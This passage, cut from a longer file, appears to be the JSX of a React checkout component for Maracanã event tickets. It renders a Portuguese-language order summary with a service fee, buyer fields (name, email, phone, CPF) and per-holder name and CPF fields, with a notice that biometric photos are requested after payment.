              {timerMinutes}:{timerSeconds}
            </span>
          </div>
        </div>

        <form onSubmit={onSubmit} className="mt-8 space-y-8">
          {/* Resumo */}
          <section className="rounded-2xl border border-border bg-card p-5 shadow-sm">
            <h2 className="font-bold text-foreground">Resumo do pedido</h2>
            <ul className="mt-3 space-y-1 text-sm">
              {cart.items.map((item, i) => (
                <li key={i} className="flex justify-between text-foreground">
                  <span>
                    {item.qty}× {item.sectorName} –{" "}
                    {item.ticketType === "meia" ? "Meia-Entrada" : "Inteira"}
                  </span>
                  <span className="font-semibold">{formatBRL(item.unitPrice * item.qty)}</span>
                </li>
              ))}
            </ul>
            <div className="mt-3 space-y-1 border-t border-border pt-3 text-sm">
              <div className="flex justify-between text-muted-foreground">
                <span>Subtotal</span>
                <span>{formatBRL(subtotal)}</span>
              </div>
              <div className="flex justify-between text-muted-foreground">
                <span>Taxa de serviço (18%)</span>
                <span>{formatBRL(fee)}</span>
              </div>
              <div className="flex justify-between pt-1 font-bold text-foreground">
                <span>Total</span>
                <span className="text-primary">{formatBRL(total)}</span>
              </div>
            </div>
          </section>

          {/* Dados do comprador */}
          <section className="rounded-2xl border border-border bg-card p-5 shadow-sm">
            <h2 className="mb-4 font-bold text-foreground">Dados do comprador</h2>
            <div className="grid gap-4 sm:grid-cols-2">
              <div>
                <label className="mb-1 block text-sm font-medium text-foreground">
                  Nome completo <span className="text-red-500">*</span>
                </label>
                <input
                  className={`w-full rounded-lg border border-input bg-background px-3 py-2 text-sm text-foreground outline-none focus:ring-2 focus:ring-primary ${nameError ? 'border-red-500' : ''}`}
                  type="text"
                  value={custName}
                  onChange={(e) => setCustName(e.target.value)}
                  required
                  autoComplete="name"
                />
                {nameError && <div className="mt-1 text-xs text-red-500">{nameError}</div>}
              </div>
              <div>
                <label className="mb-1 block text-sm font-medium text-foreground">E-mail <span className="text-red-500">*</span></label>
                <input
                  className={`w-full rounded-lg border border-input bg-background px-3 py-2 text-sm text-foreground outline-none focus:ring-2 focus:ring-primary ${emailError ? 'border-red-500' : ''}`}
                  type="email"
                  value={custEmail}
                  onChange={(e) => setCustEmail(e.target.value)}
                  required
                  autoComplete="email"
                />
                {emailError && <div className="mt-1 text-xs text-red-500">{emailError}</div>}
              </div>
              <div>
                <label className="mb-1 block text-sm font-medium text-foreground">Telefone <span className="text-red-500">*</span></label>
                <input
                  className={`w-full rounded-lg border border-input bg-background px-3 py-2 text-sm text-foreground outline-none focus:ring-2 focus:ring-primary ${phoneError ? 'border-red-500' : ''}`}
                  type="tel"
                  value={custPhone}
                  onChange={(e) => setCustPhone(maskPhone(e.target.value))}
                  required
                  autoComplete="tel"
                  placeholder="(11) 99999-9999"
                />
                {phoneError && <div className="mt-1 text-xs text-red-500">{phoneError}</div>}
              </div>
              <div>
                <label className="mb-1 block text-sm font-medium text-foreground">CPF <span className="text-red-500">*</span></label>
                <input
                  className={`w-full rounded-lg border border-input bg-background px-3 py-2 text-sm text-foreground outline-none focus:ring-2 focus:ring-primary ${cpfError ? 'border-red-500' : ''}`}
                  type="text"
                  value={custCpf}
                  onChange={(e) => setCustCpf(maskCpf(e.target.value))}
                  required
                  placeholder="000.000.000-00"
                  inputMode="numeric"
                />
                {cpfError && <div className="mt-1 text-xs text-red-500">{cpfError}</div>}
              </div>
            </div>
          </section>

          {/* Portadores */}
          {ticketList.map((ticket, idx) => (
            <section
              key={idx}
              className="rounded-2xl border border-border bg-card p-5 shadow-sm"
            >
              <div className="mb-4 flex items-center justify-between">
                <h2 className="font-bold text-foreground">
                  Portador {idx + 1}
                  <span className="ml-2 text-xs font-normal text-muted-foreground">
                    ({ticket.label})
                  </span>
                </h2>
                <button
                  type="button"
                  className="text-xs text-primary underline"
                  onClick={() => copyBuyerToHolder(idx)}
                >
                  Usar dados do comprador
                </button>
              </div>

              {/* Aviso: Foto será solicitada após pagamento */}
              <div className="mb-4 rounded-xl border border-blue-400 bg-blue-50 dark:bg-blue-950/30 p-3">
                <p className="text-xs font-semibold text-blue-800 dark:text-blue-300 flex items-center gap-2">
                  <span>ℹ️</span> Foto biométrica (pós-pagamento)
                </p>
                <p className="mt-1 text-xs text-blue-700 dark:text-blue-400">
                  Após confirmar o pagamento, você será solicitado a enviar as fotos dos portadores para acesso biométrico ao Maracanã.
                </p>
              </div>

              <div className="grid gap-4 sm:grid-cols-2">
                <div>
                  <label className="mb-1 block text-sm font-medium text-foreground">
                    Nome completo <span className="text-red-500">*</span>
                  </label>
                  <input
                    className="w-full rounded-lg border border-input bg-background px-3 py-2 text-sm text-foreground outline-none focus:ring-2 focus:ring-primary"
                    type="text"
                    value={holders[idx]?.name ?? ""}
                    onChange={(e) => setHolder(idx, "name", e.target.value)}
                    required
                  />
                </div>
                <div>
                  <label className="mb-1 block text-sm font-medium text-foreground">CPF <span className="text-red-500">*</span></label>
                  <input
                    className="w-full rounded-lg border border-input bg-background px-3 py-2 text-sm text-foreground outline-none focus:ring-2 focus:ring-primary"
                    type="text"
                    value={holders[idx]?.cpf ?? ""}
                    onChange={(e) => setHolder(idx, "cpf", e.target.value)}
                    required
                    placeholder="000.000.000-00"
                    inputMode="numeric"
                  />
                </div>
              </div>
            </section>
          ))}


          <button
            type="submit"
            disabled={submitting || formInvalid}
            className="w-full rounded-full bg-primary py-4 text-base font-bold text-primary-foreground transition hover:bg-primary/90 disabled:opacity-60"
          >
            {submitting ? "Processando..." : "Pagar"}
          </button>
        </form>
      </main>

      <Footer />
    </div>
  );
}
